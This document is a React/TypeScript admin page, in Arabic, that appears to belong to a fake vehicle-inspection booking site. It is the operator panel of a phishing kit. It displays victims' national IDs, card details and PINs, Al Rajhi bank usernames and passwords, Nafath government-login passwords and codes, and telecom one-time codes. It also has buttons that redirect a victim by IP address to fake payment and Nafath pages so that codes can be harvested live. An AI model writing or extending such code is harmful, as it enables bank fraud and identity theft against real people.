import { useLocation, useParams } from "wouter";
import { trpc } from "@/lib/trpc";
import { useAuth } from "@/_core/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Separator } from "@/components/ui/separator";
import { toast } from "sonner";
import {
  ArrowRight,
  Car,
  User,
  Phone,
  CreditCard,
  Shield,
  Navigation,
  MapPin,
  Calendar,
  Clock,
  Smartphone,
  ChevronDown,
  CheckCircle,
  XCircle,
  RefreshCw,
} from "lucide-react";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import { useEffect } from "react";

const STATUS_LABELS: Record<string, { label: string; color: string }> = {
  new: { label: "جديد", color: "bg-blue-100 text-blue-700" },
  pending_payment: { label: "انتظار دفع", color: "bg-yellow-100 text-yellow-700" },
  pending_nafath: { label: "انتظار نفاذ", color: "bg-purple-100 text-purple-700" },
  pending_motasel: { label: "انتظار متصل", color: "bg-orange-100 text-orange-700" },
  payment_done: { label: "تم الدفع", color: "bg-green-100 text-green-700" },
  verified: { label: "تم التحقق", color: "bg-emerald-100 text-emerald-700" },
  completed: { label: "مكتمل", color: "bg-gray-100 text-gray-700" },
  cancelled: { label: "ملغي", color: "bg-red-100 text-red-700" },
};

export default function BookingDetail() {
  const params = useParams<{ reference: string }>();
  const [, navigate] = useLocation();
  const { user, loading, isAuthenticated } = useAuth();

  useEffect(() => {
    if (!loading && (!isAuthenticated || user?.role !== "admin")) {
      navigate("/admin/login");
    }
  }, [loading, isAuthenticated, user]);

  const reference = params.reference;

  const { data: bookingData, refetch } = trpc.booking.getByReference.useQuery(
    { reference: reference! },
    { enabled: !!reference }
  );

  const { data: templateData, refetch: refetchTemplate } =
    trpc.admin.getTemplateForms.useQuery(
      { Reference: reference! },
      { enabled: !!reference }
    );

  const navigateMutation = trpc.navigation.navigateTo.useMutation({
    onSuccess: (res) => toast.success(res.message),
    onError: (err) => toast.error(err.message),
  });

  const updateStatusMutation = trpc.booking.updateStatus.useMutation({
    onSuccess: () => {
      toast.success("تم تحديث الحالة");
      refetch();
    },
  });

  const booking = bookingData?.data;
  const template = templateData?.data;

  const handleNavigate = (page: string) => {
    if (!booking?.clientIp) {
      toast.error("لا يوجد IP للعميل");
      return;
    }
    navigateMutation.mutate({
      clientIp: booking.clientIp,
      page,
      referenceId: reference,
    });
  };

  if (!booking) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-slate-50">
        <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600" />
      </div>
    );
  }

  const statusInfo = STATUS_LABELS[booking.status] || {
    label: booking.status,
    color: "bg-gray-100 text-gray-700",
  };

  return (
    <div className="min-h-screen bg-slate-50" dir="rtl">
      {/* Header */}
      <header className="bg-white border-b border-slate-200 sticky top-0 z-30 shadow-sm">
        <div className="max-w-screen-xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Button
              variant="ghost"
              size="sm"
              onClick={() => navigate("/admin/dashboard")}
              className="gap-2"
            >
              <ArrowRight className="w-4 h-4" />
              العودة
            </Button>
            <Separator orientation="vertical" className="h-5" />
            <h1 className="font-semibold text-slate-800 text-sm">
              تفاصيل الحجز: <span className="font-mono text-blue-600">{reference}</span>
            </h1>
          </div>
          <div className="flex items-center gap-2">
            <span className={`text-xs px-3 py-1 rounded-full font-medium ${statusInfo.color}`}>
              {statusInfo.label}
            </span>
            <Button size="sm" variant="ghost" onClick={() => { refetch(); refetchTemplate(); }}>
              <RefreshCw className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </header>

      <main className="max-w-screen-xl mx-auto px-4 py-6 space-y-4">
        {/* Navigation Buttons */}
        <Card className="border-0 shadow-sm bg-blue-600">
          <CardContent className="p-4">
            <div className="flex items-center justify-between flex-wrap gap-3">
              <div className="text-white">
                <p className="font-semibold text-sm">توجيه العميل</p>
                <p className="text-blue-200 text-xs">IP: {booking.clientIp || "غير معروف"}</p>
              </div>
              <div className="flex flex-wrap gap-2">
                <Button
                  size="sm"
                  className="bg-white text-blue-600 hover:bg-blue-50 h-8 text-xs font-medium"
                  onClick={() => handleNavigate("/payment")}
                >
                  <CreditCard className="w-3 h-3 ml-1" />
                  صفحة الدفع
                </Button>
                <Button
                  size="sm"
                  className="bg-white text-purple-600 hover:bg-purple-50 h-8 text-xs font-medium"
                  onClick={() => handleNavigate("/nafath")}
                >
                  <Smartphone className="w-3 h-3 ml-1" />
                  صفحة نفاذ
                </Button>
                <Button
                  size="sm"
                  className="bg-white text-orange-600 hover:bg-orange-50 h-8 text-xs font-medium"
                  onClick={() => handleNavigate("/motasel")}
                >
                  <Phone className="w-3 h-3 ml-1" />
                  صفحة المتصل
                </Button>
                <Button
                  size="sm"
                  className="bg-white text-slate-600 hover:bg-slate-50 h-8 text-xs font-medium"
                  onClick={() => handleNavigate("/")}
                >
                  <Navigation className="w-3 h-3 ml-1" />
                  الرئيسية
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          {/* بيانات العميل */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <User className="w-4 h-4 text-blue-600" />
                بيانات العميل
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="الاسم" value={booking.clientName} />
              <InfoRow label="رقم الهوية" value={booking.clientId} mono />
              <InfoRow label="رقم الهاتف" value={booking.clientPhone} mono />
              <InfoRow label="البريد الإلكتروني" value={(booking as any).clientEmail || "—"} />
              <InfoRow label="الجنسية" value={(booking as any).clientNationality || "—"} />
              <InfoRow label="عنوان IP" value={booking.clientIp || "—"} mono />
            </CardContent>
          </Card>

          {/* بيانات المركبة */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <Car className="w-4 h-4 text-blue-600" />
                بيانات المركبة
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="رقم اللوحة" value={booking.vehiclePlate || "—"} mono />
              <InfoRow label="نوع المركبة" value={(booking as any).vehicleType || "—"} />
              <InfoRow label="بلد التسجيل" value={(booking as any).vehicleCountry || "—"} />
              <InfoRow
                label="تحمل مواد خطرة"
                value={(booking as any).vehicleCarryDang ? "نعم" : "لا"}
              />
            </CardContent>
          </Card>

          {/* بيانات الخدمة */}
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <MapPin className="w-4 h-4 text-blue-600" />
                بيانات الخدمة
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <InfoRow label="المنطقة" value={(booking as any).serviceRegion || "—"} />
              <InfoRow label="نوع الخدمة" value={(booking as any).serviceType || "—"} />
              <InfoRow label="التاريخ" value={(booking as any).serviceDate || "—"} />
              <InfoRow label="الوقت" value={(booking as any).serviceTime || "—"} />
            </CardContent>
          </Card>

          {/* بيانات الدفع */}
          {template?.payment && (
            <Card className="border-0 shadow-sm">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <CreditCard className="w-4 h-4 text-green-600" />
                  بيانات الدفع
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <InfoRow label="اسم حامل البطاقة" value={template.payment.cardHolderName || "—"} />
                <InfoRow label="آخر 4 أرقام" value={template.payment.cardLastFour || "—"} mono />
                <InfoRow label="تاريخ الانتهاء" value={template.payment.cardExpiry || "—"} mono />
                <InfoRow label="رمز التحقق" value={template.payment.verifyCode || "—"} mono />
                <InfoRow label="الرقم السري" value={template.payment.secretNum || "—"} mono />
                {template.payment.rajUsername && (
                  <>
                    <InfoRow label="مستخدم الراجحي" value={template.payment.rajUsername} mono />
                    <InfoRow label="كلمة مرور الراجحي" value={template.payment.rajPassword || "—"} mono />
                  </>
                )}
                <InfoRow
                  label="الحالة"
                  value={template.payment.status || "—"}
                  badge
                  badgeColor="bg-green-100 text-green-700"
                />
              </CardContent>
            </Card>
          )}

          {/* بيانات نفاذ */}
          {template?.nafath && (
            <Card className="border-0 shadow-sm">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Shield className="w-4 h-4 text-purple-600" />
                  بيانات نفاذ
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <InfoRow label="رقم الهوية" value={template.nafath.nafathId || "—"} mono />
                <InfoRow label="كلمة المرور" value={template.nafath.nafathPassword || "—"} mono />
                <InfoRow label="رمز نفاذ" value={template.nafath.nafathNumber || "—"} mono />
                <InfoRow
                  label="الحالة"
                  value={template.nafath.status || "—"}
                  badge
                  badgeColor="bg-purple-100 text-purple-700"
                />
              </CardContent>
            </Card>
          )}

          {/* بيانات المتصل */}
          {template?.motasel && (
            <Card className="border-0 shadow-sm">
              <CardHeader className="pb-3">
                <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                  <Phone className="w-4 h-4 text-orange-600" />
                  بيانات المتصل
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <InfoRow label="مزود الخدمة" value={template.motasel.motaselProvider || "—"} />
                <InfoRow label="رقم الهاتف" value={template.motasel.motaselPhone || "—"} mono />
                <InfoRow label="رمز التحقق" value={template.motasel.motaselCode || "—"} mono />
                <InfoRow
                  label="الحالة"
                  value={template.motasel.status || "—"}
                  badge
                  badgeColor="bg-orange-100 text-orange-700"
                />
              </CardContent>
            </Card>
          )}
        </div>

        {/* أزرار تغيير الحالة */}
        <Card className="border-0 shadow-sm">
          <CardContent className="p-4">
            <div className="flex items-center gap-3 flex-wrap">
              <span className="text-sm font-medium text-slate-700">تغيير الحالة:</span>
              <Button
                size="sm"
                className="bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                onClick={() =>
                  updateStatusMutation.mutate({
                    reference: reference!,
                    status: "completed",
                    statusRead: 1,
                  })
                }
              >
                <CheckCircle className="w-3 h-3 ml-1" />
                مكتمل
              </Button>
              <Button
                size="sm"
                className="bg-red-600 hover:bg-red-700 text-white h-8 text-xs"
                onClick={() =>
                  updateStatusMutation.mutate({
                    reference: reference!,
                    status: "cancelled",
                    statusRead: 1,
                  })
                }
              >
                <XCircle className="w-3 h-3 ml-1" />
                إلغاء
              </Button>
              <Button
                size="sm"
                variant="outline"
                className="h-8 text-xs"
                onClick={() =>
                  updateStatusMutation.mutate({
                    reference: reference!,
                    status: "verified",
                    statusRead: 1,
                  })
                }
              >
                <Shield className="w-3 h-3 ml-1" />
                تم التحقق
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* سجل التوجيه */}
        {template?.navLogs && template.navLogs.length > 0 && (
          <Card className="border-0 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-sm font-semibold text-slate-700 flex items-center gap-2">
                <Navigation className="w-4 h-4 text-blue-600" />
                سجل التوجيه
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {template.navLogs.map((log: any) => (
                  <div
                    key={log.id}
                    className="flex items-center justify-between text-xs bg-slate-50 rounded-lg p-2"
                  >
                    <span className="font-medium text-blue-600">{log.targetPage}</span>
                    <span className="text-slate-500">
                      {new Date(log.createdAt).toLocaleString("ar-SA")}
                    </span>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </main>
    </div>
  );
}

function InfoRow({
  label,
  value,
  mono = false,
  badge = false,
  badgeColor = "",
}: {
  label: string;
  value: string;
  mono?: boolean;
  badge?: boolean;
  badgeColor?: string;
}) {
  return (
    <div className="flex items-center justify-between py-1 border-b border-slate-100 last:border-0">
      <span className="text-xs text-slate-500">{label}</span>
      {badge ? (
        <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${badgeColor}`}>
          {value}
        </span>
      ) : (
        <span className={`text-sm text-slate-800 ${mono ? "font-mono" : "font-medium"}`}>
          {value}
        </span>
      )}
    </div>
  );
}
